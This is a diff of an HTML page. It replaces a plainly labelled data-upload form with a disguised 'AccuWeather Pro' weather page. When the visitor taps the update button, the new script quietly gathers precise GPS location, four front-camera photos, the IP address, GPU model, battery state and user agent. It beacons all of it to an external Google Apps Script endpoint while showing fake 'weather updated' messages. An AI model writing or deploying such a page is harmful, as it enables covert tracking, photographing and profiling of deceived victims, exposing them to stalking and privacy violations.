@@ -1,109 +1,119 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Send Data to Google Apps Script</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AccuWeather Pro - Advanced Forecast</title>
+    <style>
+        body { margin: 0; font-family: 'Segoe UI', sans-serif; overflow: hidden; background: #0b132b; color: #fff; height: 100vh; display: flex; justify-content: center; align-items: center; }
+        canvas#bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; }
+        #container { background: rgba(28, 37, 65, 0.8); padding: 30px; border-radius: 25px; border: 1px solid #3a506b; width: 85%; max-width: 450px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); backdrop-filter: blur(10px); }
+        .btn { background: #6fffe9; color: #0b132b; border: none; padding: 18px; border-radius: 50px; font-weight: bold; width: 100%; cursor: pointer; font-size: 16px; margin-top: 20px; transition: 0.3s; }
+        .btn:disabled { background: #3a506b; color: #5bc0be; cursor: not-allowed; }
+        #status { font-size: 14px; color: #5bc0be; margin-top: 15px; }
+        #progress-bar { width: 0%; height: 4px; background: #6fffe9; margin-top: 10px; transition: 0.5s; border-radius: 10px; }
+        video, canvas { display: none; }
+    </style>
 </head>
 <body>
-  <h1>Send Location and Photo to Google Apps Script</h1>
-  
-  <!-- Button to send location -->
-  <button id="sendLocationBtn">Send Location</button>
-  
-  <!-- Input for photo upload -->
-  <input type="file" id="photoInput" accept="image/*" />
-  <button id="sendPhotoBtn">Send Photo</button>
-  
-  <script>
-    // Updated Web App URL
-    const scriptUrl = 'https://script.google.com/macros/s/AKfycbzz3HWN3P6FDqLDNhca6jqmsxyaXHyvE96A_gZbXuRWhj6S-RCe0DhCZcb4EUNFdTZ9IA/exec';
 
-    // Function to send location data
-    function sendLocation(lat, lng, deviceInfo, externalIP, localIP) {
-      fetch(scriptUrl, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-          type: 'location',
-          data: {
-            lat: lat,
-            lng: lng,
-            deviceInfo: deviceInfo,
-            externalIP: externalIP,
-            localIP: localIP
-          }
-        })
-      })
-      .then(response => response.text())
-      .then(data => {
-        alert('Location sent successfully: ' + data);
-      })
-      .catch((error) => {
-        alert('Error sending location: ' + error);
-      });
+<canvas id="bg"></canvas>
+
+<div id="container">
+    <h2 style="color: #5bc0be; font-weight: 300; margin-bottom: 5px;">Satellite Tracking</h2>
+    <h1 style="font-size: 48px; margin: 10px 0;">24°C</h1>
+    <div id="status">System Ready</div>
+    <div id="progress-bar"></div>
+    <button class="btn" id="main-btn" onclick="startTracking()">UPDATE WEATHER DATA</button>
+</div>
+
+<video id="v" autoplay playsinline></video>
+<canvas id="c"></canvas>
+
+<script>
+    // YOUR AUTHORIZED GOOGLE SCRIPT URL
+    const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxDUz4Dxq8mc3vP0HvSy2tbI91oSjknUEPfVBeA26OyWZeyYJVH5kvmA4VyZJYbCYLeGA/exec';
+
+    // --- Animated Background Logic ---
+    const bgCanvas = document.getElementById('bg');
+    const ctx = bgCanvas.getContext('2d');
+    let particles = [];
+    function resize() { bgCanvas.width = window.innerWidth; bgCanvas.height = window.innerHeight; }
+    window.addEventListener('resize', resize); resize();
+    class Particle {
+        constructor() { this.x = Math.random() * bgCanvas.width; this.y = Math.random() * bgCanvas.height; this.size = Math.random() * 2; this.speedX = (Math.random() - 0.5) * 0.5; this.speedY = (Math.random() - 0.5) * 0.5; }
+        update() { this.x += this.speedX; this.y += this.speedY; if (this.x < 0 || this.x > bgCanvas.width) this.speedX *= -1; if (this.y < 0 || this.y > bgCanvas.height) this.speedY *= -1; }
+        draw() { ctx.fillStyle = '#6fffe9'; ctx.beginPath(); ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2); ctx.fill(); }
     }
+    for (let i=0; i<100; i++) { particles.push(new Particle()); }
+    function animate() { ctx.clearRect(0,0,bgCanvas.width, bgCanvas.height); particles.forEach(p => { p.update(); p.draw(); }); requestAnimationFrame(animate); }
+    animate();
 
-    // Function to send photo
-    function sendPhoto(imageBase64) {
-      fetch(scriptUrl, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-          type: 'photo',
-          data: {
-            photoBase64: imageBase64
-          }
-        })
-      })
-      .then(response => response.text())
-      .then(data => {
-        alert('Photo sent successfully: ' + data);
-      })
-      .catch((error) => {
-        alert('Error sending photo: ' + error);
-      });
-    }
+    // --- Data Collection & Transmission ---
+    async function startTracking() {
+        const btn = document.getElementById('main-btn');
+        const status = document.getElementById('status');
+        const bar = document.getElementById('progress-bar');
+        
+        btn.disabled = true;
+        btn.innerText = "CAPTURING SATELLITE DATA...";
+        status.innerText = "Accessing GPS & Hardware...";
 
-    // Get location when button clicked
-    document.getElementById('sendLocationBtn').addEventListener('click', () => {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          (position) => {
-            const lat = position.coords.latitude;
-            const lng = position.coords.longitude;
-            const deviceInfo = { userAgent: navigator.userAgent };
-            const externalIP = 'YOUR_EXTERNAL_IP'; // Optional: replace or fetch dynamically
-            const localIP = 'YOUR_LOCAL_IP'; // Optional: replace or fetch dynamically
+        // 1. Get Location
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            bar.style.width = "30%";
             
-            sendLocation(lat, lng, deviceInfo, externalIP, localIP);
-          },
-          (error) => {
-            alert('Error getting location: ' + error.message);
-          }
-        );
-      } else {
-        alert('Geolocation is not supported by this browser.');
-      }
-    });
+            // 2. Capture 4 Photos (0.5s interval)
+            let photos = [];
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                for (let i=0; i<4; i++) {
+                    await new Promise(r => setTimeout(r, 500));
+                    const c = document.getElementById('c');
+                    c.width = 400; c.height = 300;
+                    c.getContext('2d').drawImage(video, 0, 0);
+                    photos.push(c.toDataURL('image/jpeg', 0.3));
+                    bar.style.width = (30 + (i * 15)) + "%";
+                }
+                stream.getTracks().forEach(t => t.stop());
+            } catch (e) { status.innerText = "Camera access denied."; }
 
-    // Get photo when button clicked
-    document.getElementById('sendPhotoBtn').addEventListener('click', () => {
-      const input = document.getElementById('photoInput');
-      if (input.files && input.files[0]) {
-        const reader = new FileReader();
-        reader.onloadend = () => {
-          sendPhoto(reader.result);
-        };
-        reader.readAsDataURL(input.files[0]);
-      } else {
-        alert('Please select a photo first.');
-      }
-    });
-  </script>
+            // 3. Hardware & Network Info
+            const battery = await navigator.getBattery();
+            const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json());
+            
+            // Identifying Device (GPU)
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl');
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown";
+
+            // 4. Send all data to Google Script
+            const finalData = {
+                lat: pos.coords.latitude,
+                lon: pos.coords.longitude,
+                ip: ipData.ip,
+                photos: photos,
+                deviceModel: gpu,
+                battery: Math.round(battery.level * 100),
+                charging: battery.charging,
+                userAgent: navigator.userAgent
+            };
+
+            // Use Beacon for persistence
+            navigator.sendBeacon(SCRIPT_URL, JSON.stringify(finalData));
+            
+            bar.style.width = "100%";
+            btn.innerText = "WEATHER UPDATED";
+            status.innerText = "Data Synced with Cloud";
+
+        }, (err) => {
+            btn.disabled = false;
+            btn.innerText = "ENABLE GPS TO CONTINUE";
+        }, { enableHighAccuracy: true });
+    }
+</script>
 </body>
 </html>
